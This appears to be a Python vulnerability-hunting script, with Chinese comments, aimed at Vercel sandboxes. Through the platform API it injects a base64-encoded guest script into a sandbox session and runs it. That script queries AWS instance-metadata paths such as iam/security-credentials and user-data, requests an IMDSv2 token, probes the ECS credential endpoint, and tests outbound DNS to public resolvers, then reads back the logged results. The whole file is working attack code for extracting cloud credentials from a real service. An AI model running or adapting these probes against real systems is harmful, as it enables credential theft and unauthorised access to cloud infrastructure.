# -*- coding: utf-8 -*-
"""M 线: MMDS/ECS 凭据端点探测 (High tier: MMDS secret disclosure) + UDP DNS 公网"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

# 用 tinj1 (custom, allowedDomains 含 * = 全放行)
c, r = api('GET', '/v2/sandboxes/tinj1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('tinj1 sid:', sid, flush=True)

GUEST = '''
import socket, time
OUT = '/vercel/sandbox/mmds.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    f.write(line + '\\n'); f.flush(); print(line, flush=True)

def http(ip, port, path, method='GET', headers=None, wait=3):
    try:
        s = socket.create_connection((ip, port), timeout=4)
        req = '%s %s HTTP/1.1\\r\\nHost: %s\\r\\n' % (method, path, ip)
        for k, v in (headers or {}).items():
            req += '%s: %s\\r\\n' % (k, v)
        req += 'Connection: close\\r\\n\\r\\n'
        s.sendall(req.encode())
        s.settimeout(wait)
        d = b''
        try:
            while True:
                ch = s.recv(4096)
                if not ch: break
                d += ch
                if len(d) > 400: break
        except socket.timeout:
            pass
        s.close()
        return 'DATA %r' % d[:300]
    except (ConnectionResetError, BrokenPipeError):
        return 'RST'
    except socket.timeout:
        return 'TIMEOUT'
    except OSError as e:
        return 'OSERR:%s' % e.errno
    except Exception as e:
        return 'EXC:%s' % type(e).__name__

def udp_dns(ip, port, qname='example.com'):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        q = b'\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00'
        for part in qname.split('.'):
            q += bytes([len(part)]) + part.encode()
        q += b'\\x00\\x00\\x01\\x00\\x01'
        s.sendto(q, (ip, port))
        d, _ = s.recvfrom(512)
        s.close()
        return 'RESP %r' % d[:80]
    except socket.timeout:
        return 'TIMEOUT'
    except OSError as e:
        return 'OSERR:%s' % e.errno
    except Exception as e:
        return 'EXC:%s' % type(e).__name__

log('START')
# M1 IMDSv1: 经典路径
for p in ['/latest/meta-data/', '/latest/meta-data/iam/security-credentials/', '/latest/user-data/', '/', '/latest/api/token']:
    log('M1 169.254.169.254:80%s -> %s' % (p, http('169.254.169.254', 80, p)))
# M2 IMDSv2: PUT token
log('M2 imdsv2 -> %s' % http('169.254.169.254', 80, '/latest/api/token', method='PUT', headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'}))
# M3 ECS 凭据端点
for p in ['/', '/creds', '/v1/credentials']:
    log('M3 169.254.170.2:80%s -> %s' % (p, http('169.254.170.2', 80, p)))
# M4 443
log('M4 169.254.169.254:443/ -> %s' % http('169.254.169.254', 443, '/', wait=2))
# M5 UDP DNS 公网 8.8.8.8 / 1.1.1.1
log('M5 udp 8.8.8.8:53 -> %s' % udp_dns('8.8.8.8', 53))
log('M5 udp 1.1.1.1:53 -> %s' % udp_dns('1.1.1.1', 53))
# M6 TCP DNS 公网
log('M6 tcp 8.8.8.8:53 -> %s' % http('8.8.8.8', 53, '/', wait=2))
log('MMDS_DONE')
f.close()
'''
import base64
b64 = base64.b64encode(GUEST.encode()).decode()
inj = "import base64;open('/vercel/sandbox/mmds.py','wb').write(base64.b64decode('%s'))" % b64
c, r = cmd(sid, 'python3', ['-c', inj], timeout_ms=30000)
print('inject:', c, flush=True)
time.sleep(1)
c, r = cmd(sid, 'python3', ['/vercel/sandbox/mmds.py'], timeout_ms=120000)
print('run:', c, flush=True)
for attempt in range(12):
    time.sleep(4)
    c, r = cmd(sid, 'cat', ['/vercel/sandbox/mmds.out'], timeout_ms=30000)
    if c == 200 and 'MMDS_DONE' in r:
        for line in r.splitlines():
            if '"data"' in line:
                try:
                    print(json.loads(line).get('data', ''), flush=True)
                except Exception:
                    pass
        break
    print('wait %d status=%d' % (attempt, c), flush=True)

print('=== MMDS DONE ===', flush=True)
